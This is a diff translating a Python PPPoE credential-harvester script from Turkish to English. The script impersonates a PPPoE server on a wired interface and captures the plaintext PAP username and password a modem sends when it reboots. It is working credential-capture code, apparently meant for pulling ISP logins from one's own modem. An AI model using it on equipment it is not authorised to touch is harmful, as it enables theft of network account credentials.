@@ -2,11 +2,10 @@
 """
 PPPoE Credential Harvester v2.0
 ===============================
-Bu araç, modemlerin VLAN 0 (Priority Tagging) kullanarak gönderdiği
-PPPoE paketlerini yakalamak ve PAP (Password Authentication Protocol)
-üzerinden şifreyi açık metin olarak elde etmek için geliştirilmiştir.
+This tool captures PPPoE packets sent by modems using VLAN 0 (Priority Tagging)
+and extracts plaintext passwords via PAP (Password Authentication Protocol).
 
-Kullanım:
+Usage:
     sudo python3 harvester.py
     sudo python3 harvester.py -i eth0
     sudo python3 harvester.py -i enp8s0 -t 120
@@ -25,9 +24,9 @@ import json
 from datetime import datetime
 from pathlib import Path
 
-# --- SABITLER ---
+# --- CONSTANTS ---
 DEFAULT_IFACE = "enp8s0"
-DEFAULT_TIMEOUT = 180  # saniye
+DEFAULT_TIMEOUT = 180  # seconds
 SESSION_ID = 0x5555
 LOG_DIR = Path(__file__).parent.parent / "logs"
 
@@ -44,18 +43,18 @@ class PPPoEHarvester:
         self.last_ack_id = -1
         self.start_time = None
 
-        # Log dizinini oluştur
+        # Create log directory
         LOG_DIR.mkdir(parents=True, exist_ok=True)
 
     @staticmethod
     def get_tag(tag_type, tag_value):
-        """PPPoE Discovery Tag oluştur"""
+        """Build a PPPoE Discovery Tag"""
         if isinstance(tag_value, str):
             tag_value = tag_value.encode()
         return struct.pack("!HH", tag_type, len(tag_value)) + tag_value
 
     def _extract_host_cookie(self, raw_payload):
-        """PPPoED payload'dan Host-Uniq (0x0103) tag'ini çıkar"""
+        """Extract Host-Uniq (0x0103) tag from PPPoED payload"""
         tags = b""
         idx = 0
         while idx + 4 <= len(raw_payload):
@@ -66,14 +65,14 @@ class PPPoEHarvester:
         return tags
 
     def _get_vlan_info(self, pkt):
-        """Paketten VLAN bilgilerini çıkar"""
+        """Extract VLAN info from packet"""
         vlan_id = pkt[Dot1Q].vlan if pkt.haslayer(Dot1Q) else 0
         prio = pkt[Dot1Q].prio if pkt.haslayer(Dot1Q) else 1
         return vlan_id, prio
 
     def _handle_padi(self, pkt, vlan_id, prio):
-        """PADI → PADO: Modem 'Kimse var mı?' dedi, biz cevap veriyoruz"""
-        print(f"[*] PADI Yakalandı (MAC: {pkt.src})")
+        """PADI → PADO: Respond to modem discovery probe"""
+        print(f"[*] PADI Captured (MAC: {pkt.src})")
         self.sent_lcp = False
         self.last_ack_id = -1
 
@@ -84,11 +83,11 @@ class PPPoEHarvester:
                 Dot1Q(vlan=vlan_id, prio=prio) /
                 PPPoED(code=0x07, sessionid=0, len=len(tags)))
         sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
-        print("[+] PADO Gönderildi (VLAN 0 Response)")
+        print("[+] PADO Sent (VLAN 0 Response)")
 
     def _handle_padr(self, pkt, vlan_id, prio):
-        """PADR → PADS: Modem bizi seçti, oturum açıyoruz"""
-        print(f"[*] PADR Yakalandı (MAC: {pkt.src})")
+        """PADR → PADS: Modem selected us, establish session"""
+        print(f"[*] PADR Captured (MAC: {pkt.src})")
 
         tags = self.get_tag(0x0102, "")
         tags += self._extract_host_cookie(bytes(pkt[PPPoED].payload))
@@ -97,10 +96,10 @@ class PPPoEHarvester:
                 Dot1Q(vlan=vlan_id, prio=prio) /
                 PPPoED(code=0x65, sessionid=SESSION_ID, len=len(tags)))
         sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
-        print(f"[+] PADS Gönderildi (Session ID: {hex(SESSION_ID)})")
+        print(f"[+] PADS Sent (Session ID: {hex(SESSION_ID)})")
 
     def _handle_lcp(self, pkt, vlan_id, prio):
-        """LCP Config-Request → ACK + kendi PAP talebimizi gönder"""
+        """LCP Config-Request → ACK + send our PAP request"""
         raw_ppp = bytes(pkt[PPP].payload)
         if len(raw_ppp) < 4:
             return
@@ -111,20 +110,20 @@ class PPPoEHarvester:
         if lcp_code == 0x01:
             if lcp_id != self.last_ack_id:
                 print(f"[*] LCP Config-Request (ID: {lcp_id})")
-                # ACK Gönder
+                # Send ACK
                 lcp_payload = struct.pack("!BBH", 0x02, lcp_id, lcp_len) + raw_ppp[4:lcp_len]
                 resp_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
                             Dot1Q(vlan=vlan_id, prio=prio) /
                             PPPoE(sessionid=SESSION_ID, len=2 + lcp_len) /
                             PPP(proto=0xc021))
                 sendp(bytes(resp_hdr) + lcp_payload, iface=self.iface, verbose=False)
-                print(f"[+] LCP ACK İletildi (ID: {lcp_id})")
+                print(f"[+] LCP ACK Sent (ID: {lcp_id})")
                 self.last_ack_id = lcp_id
 
-            # PAP talebi gönder (sadece bir kez)
+            # Send PAP request (only once)
             if not self.sent_lcp:
                 magic_bytes = struct.pack("!I", self.magic_number)
-                # MRU(1492) + Auth(PAP) + MagicNumber(rastgele)
+                # MRU(1492) + Auth(PAP) + MagicNumber(random)
                 opts = b"\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06" + magic_bytes
                 lcp_req_payload = struct.pack("!BBH", 0x01, 0x01, 4 + len(opts)) + opts
                 lcp_req_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
@@ -132,12 +131,12 @@ class PPPoEHarvester:
                                PPPoE(sessionid=SESSION_ID, len=2 + len(lcp_req_payload)) /
                                PPP(proto=0xc021))
                 sendp(bytes(lcp_req_hdr) + lcp_req_payload, iface=self.iface, verbose=False)
-                print("[+] PAP Auth Talebi Gönderildi")
+                print("[+] PAP Auth Request Sent")
                 self.sent_lcp = True
 
     def _handle_pap(self, pkt):
-        """PAP Request → Şifre yakalandı!"""
-        print("\n" + "!" * 60 + "\n🎉 PPPoE KİMLİK BİLGİLERİ YAKALANDI!")
+        """PAP Request → Password captured!"""
+        print("\n" + "!" * 60 + "\n🎉 PPPoE CREDENTIALS CAPTURED!")
         try:
             p_data = bytes(pkt[PPP].payload) if pkt.haslayer(PPP) else bytes(pkt[PPP_PAP_Request])
             if p_data[0] == 0x01:  # Authenticate-Request
@@ -146,19 +145,19 @@ class PPPoEHarvester:
                 p_len = p_data[5 + u_len]
                 password = p_data[6 + u_len:6 + u_len + p_len].decode('utf-8', errors='ignore')
 
-                print(f"Kullanıcı Adı: {user}\nŞifre:        {password}")
+                print(f"Username: {user}\nPassword:     {password}")
                 print("!" * 60 + "\n")
 
-                # Sonuçları log dosyasına kaydet
+                # Save results to log file
                 self._save_credentials(user, password)
                 sys.exit(0)
         except Exception as e:
-            print(f"[!] Ayrıştırma hatası: {e}")
+            print(f"[!] Parse error: {e}")
             if 'p_data' in locals():
-                print(f"[!] Ham Veri: {p_data.hex()}")
+                print(f"[!] Raw Data: {p_data.hex()}")
 
     def _save_credentials(self, username, password):
-        """Yakalanan kimlik bilgilerini log dosyasına kaydet"""
+        """Save captured credentials to log file"""
         result = {
             "username": username,
             "password": password,
@@ -171,18 +170,18 @@ class PPPoEHarvester:
         try:
             with open(log_file, 'w') as f:
                 json.dump(result, f, indent=2, ensure_ascii=False)
-            print(f"[+] Sonuçlar kaydedildi: {log_file}")
+            print(f"[+] Results saved: {log_file}")
         except Exception as e:
-            print(f"[!] Log kaydetme hatası: {e}")
+            print(f"[!] Log save error: {e}")
 
     def handle_pkt(self, pkt):
-        """Ana paket işleyici"""
-        # Timeout kontrolü
+        """Main packet handler"""
+        # Timeout check
         if self.timeout and self.start_time:
             elapsed = time.time() - self.start_time
             if elapsed > self.timeout:
-                print(f"\n[!] Zaman aşımı ({self.timeout}s). Şifre yakalanamadı.")
-                print("[*] Modemi yeniden başlatıp tekrar deneyin.")
+                print(f"\n[!] Timeout ({self.timeout}s). Password not captured.")
+                print("[*] Reboot the modem and try again.")
                 sys.exit(1)
 
         # --- DISCOVERY (0x8863) ---
@@ -207,18 +206,18 @@ class PPPoEHarvester:
                 self._handle_pap(pkt)
 
     def run(self):
-        """Harvester'ı başlat"""
-        print(f"[*] {self.iface} üzerinde Harvester Başlatıldı (VLAN-Aware)...")
+        """Start the harvester"""
+        print(f"[*] Harvester Started on {self.iface} (VLAN-Aware)...")
         print(f"[*] Magic Number: {hex(self.magic_number)}")
         if self.timeout:
-            print(f"[*] Zaman aşımı: {self.timeout} saniye")
-        print("[!] HAZIR! Modemi şimdi yeniden başlatın.\n")
+            print(f"[*] Timeout: {self.timeout} seconds")
+        print("[!] READY! Reboot the modem now.\n")
 
         self.start_time = time.time()
 
-        # Ctrl+C ile temiz çıkış
+        # Clean exit on Ctrl+C
         def signal_handler(sig, frame):
-            print("\n[*] Kullanıcı tarafından durduruldu.")
+            print("\n[*] Stopped by user.")
             sys.exit(0)
         signal.signal(signal.SIGINT, signal_handler)
 
@@ -230,23 +229,23 @@ def main():
         description="PPPoE Credential Harvester - VLAN 0 Aware",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-Örnekler:
-  sudo python3 harvester.py                    # Varsayılan arayüz (enp8s0)
-  sudo python3 harvester.py -i eth0            # Farklı arayüz
-  sudo python3 harvester.py -i enp8s0 -t 120   # 2 dakika timeout
-  sudo python3 harvester.py -t 0               # Timeout yok (sonsuz bekleme)
+Examples:
+  sudo python3 harvester.py                    # Default interface (enp8s0)
+  sudo python3 harvester.py -i eth0            # Different interface
+  sudo python3 harvester.py -i enp8s0 -t 120   # 2 minute timeout
+  sudo python3 harvester.py -t 0               # No timeout (wait indefinitely)
         """
     )
     parser.add_argument(
         "-i", "--interface",
         default=DEFAULT_IFACE,
-        help=f"Ethernet arayüzü (varsayılan: {DEFAULT_IFACE})"
+        help=f"Ethernet interface (default: {DEFAULT_IFACE})"
     )
     parser.add_argument(
         "-t", "--timeout",
         type=int,
         default=DEFAULT_TIMEOUT,
-        help=f"Bekleme zaman aşımı, saniye (varsayılan: {DEFAULT_TIMEOUT}, 0=sınırsız)"
+        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT}, 0=unlimited)"
     )
     args = parser.parse_args()
 
